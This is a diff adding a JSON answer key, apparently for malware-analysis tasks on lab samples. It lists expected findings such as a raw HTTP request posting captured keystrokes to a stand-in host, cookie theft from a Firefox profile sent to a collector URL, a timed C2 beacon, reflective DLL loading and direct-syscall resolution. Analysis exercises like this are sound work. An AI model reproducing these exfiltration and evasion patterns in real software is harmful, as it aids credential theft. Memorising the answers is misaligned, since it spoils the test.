@@ -1,0 +1,225 @@
+{
+  "compat_host.elf": {
+    "answers": {
+      "platform": {
+        "api_name": "IsWow64Process2",
+        "required_native_machine": 34404,
+        "required_process_machine": 332
+      },
+      "requests": {
+        "accepted": [
+          true,
+          false,
+          false
+        ],
+        "effective_targets": [
+          6442455600,
+          0,
+          0
+        ]
+      },
+      "transition_data": {
+        "context_width_bytes": 8,
+        "entry_selector": 51,
+        "marker_hex": "ff2a",
+        "return_selector": 35
+      }
+    },
+    "schema_version": 1
+  },
+  "inputsvc.elf": {
+    "answers": {
+      "alternate": {
+        "selected": false,
+        "url": "http://203.0.113.9:8080/collect"
+      },
+      "capture": {
+        "text": "Dev7!\nlab\t42"
+      },
+      "destination": {
+        "url": "https://198.51.100.42:8443/v1/events"
+      },
+      "request": {
+        "wire": "POST /v1/events HTTP/1.1\r\nHost: 198.51.100.42:8443\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nsid=qa17&keys=Dev7%21%0Alab%0942"
+      }
+    },
+    "schema_version": 1
+  },
+  "modulehost.elf": {
+    "answers": {
+      "imports": {
+        "bindings": [
+          {
+            "requested": "KERNEL32.dll!VirtualAlloc",
+            "resolved": "KERNELBASE.dll!VirtualAlloc"
+          },
+          {
+            "requested": "KERNELBASE.dll!#11",
+            "resolved": "KERNELBASE.dll!VirtualProtect"
+          },
+          {
+            "requested": "NTDLL.dll!#100",
+            "resolved": "NTDLL.dll!NtProtectVirtualMemory"
+          }
+        ]
+      },
+      "mapping": {
+        "entrypoint": 6710890560,
+        "image": "telemetry_stage.dll",
+        "rejected_sections": [
+          ".decoy"
+        ],
+        "sections": [
+          ".text",
+          ".rdata",
+          ".data"
+        ]
+      },
+      "rejected": {
+        "imports": [
+          {
+            "reason": "forwarder-cycle",
+            "requested": "KERNEL32.dll!LoopAlias"
+          },
+          {
+            "reason": "ordinal-out-of-range",
+            "requested": "KERNELBASE.dll!#99"
+          },
+          {
+            "reason": "missing-export",
+            "requested": "KERNEL32.dll!CreateFileW"
+          }
+        ]
+      },
+      "relocations": {
+        "rvas": [
+          12288,
+          12296
+        ],
+        "skipped_rvas": [
+          12304
+        ],
+        "values": [
+          6710894672,
+          6710890560
+        ]
+      }
+    },
+    "schema_version": 1
+  },
+  "profile_sync.elf": {
+    "answers": {
+      "cookies": {
+        "records": [
+          {
+            "domain": "portal.example",
+            "expires": 1800000200,
+            "name": "sid",
+            "value": "MOCK-ROTATED"
+          },
+          {
+            "domain": "docs.example",
+            "expires": 1800000300,
+            "name": "theme",
+            "value": "dark"
+          }
+        ]
+      },
+      "export": {
+        "body": "portal.example\tsid\tMOCK-ROTATED\t1800000200\ndocs.example\ttheme\tdark\t1800000300\n",
+        "method": "POST",
+        "url": "https://collector.invalid/v1/cookies"
+      },
+      "profile": {
+        "database": "/home/demo/.mozilla/firefox/Profiles/review.default-release/cookies.sqlite"
+      }
+    },
+    "schema_version": 1
+  },
+  "stage_builder.elf": {
+    "answers": {
+      "layout": {
+        "entry_offset": 136,
+        "loader_size": 48,
+        "parameter_offset": 177,
+        "payload_size": 129,
+        "total_size": 192
+      },
+      "parameter": {
+        "ascii": "--mode=inspect"
+      },
+      "patches": {
+        "entry_relative_displacement": 112,
+        "parameter_relative_displacement": 149,
+        "payload_offset": 48,
+        "payload_size": 129
+      },
+      "selection": {
+        "loader_bits": 64,
+        "optional_header_magic": 523,
+        "pe_machine": 34404
+      }
+    },
+    "schema_version": 1
+  },
+  "sysbridge.elf": {
+    "answers": {
+      "recovery": {
+        "distance_bytes": [
+          32,
+          64,
+          0
+        ],
+        "higher_address": [
+          true,
+          false,
+          false
+        ],
+        "used_neighbor": [
+          true,
+          true,
+          false
+        ],
+        "witness_exports": [
+          "NtQueryVirtualMemory",
+          "NtQueryVirtualMemory",
+          "NtClose"
+        ]
+      },
+      "resolver": {
+        "module": "ntdll.dll",
+        "selected_exports": [
+          "NtProtectVirtualMemory",
+          "NtCreateThreadEx",
+          "NtClose"
+        ]
+      },
+      "service_tokens": {
+        "values": [
+          80,
+          83,
+          15
+        ]
+      }
+    },
+    "schema_version": 1
+  },
+  "update_agent.elf": {
+    "answers": {
+      "alternate": {
+        "accepted": false,
+        "url": "https://203.0.113.88:443/v1/push"
+      },
+      "beacon": {
+        "body": "id=lab42&tag=lab42",
+        "interval_seconds": 45,
+        "url": "https://192.0.2.77:8443/api/check"
+      },
+      "dispatch": {
+        "export": "WinHttpSendRequest",
+        "module": "winhttp.dll"
+      }
+    },
+    "schema_version": 1
+  }
+}
